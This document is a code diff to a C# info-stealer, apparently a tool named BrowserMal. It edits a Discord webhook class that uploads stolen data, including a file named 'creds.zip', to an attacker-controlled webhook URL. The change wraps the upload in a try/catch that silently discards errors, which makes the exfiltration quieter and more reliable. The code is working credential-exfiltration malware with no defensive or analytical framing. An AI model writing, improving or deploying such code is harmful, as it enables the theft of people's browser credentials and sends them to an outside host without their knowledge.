@@ -8,7 +8,7 @@ namespace BrowserMal.Discord
 {
     internal class Webhook
     {
-        private static readonly string url = Environment.GetEnvironmentVariable("DISCORD_WEBHOOK", EnvironmentVariableTarget.User);
+        public static string url = Environment.GetEnvironmentVariable("DISCORD_WEBHOOK", EnvironmentVariableTarget.User);
         public static void SendFile<T>(List<T> list, string filename)
         {
             string json = JsonConvert.SerializeObject(list, Formatting.Indented);
@@ -19,16 +19,20 @@ namespace BrowserMal.Discord
 
         private static void GenericSender(byte[] file, string filename)
         {
-            using (HttpClient httpClient = new HttpClient())
+            try
             {
-                MultipartFormDataContent form = new MultipartFormDataContent
+                using (HttpClient httpClient = new HttpClient())
+                {
+                    MultipartFormDataContent form = new MultipartFormDataContent
                 {
                     { new ByteArrayContent(file, 0, file.Length), "Document", filename }
                 };
 
-                httpClient.PostAsync(url, form).Wait();
-                httpClient.Dispose();
+                    httpClient.PostAsync(url, form).Wait();
+                    httpClient.Dispose();
+                }
             }
+            catch { }
         }
 
         public static void SendFile(byte[] file) => GenericSender(file, "creds.zip");
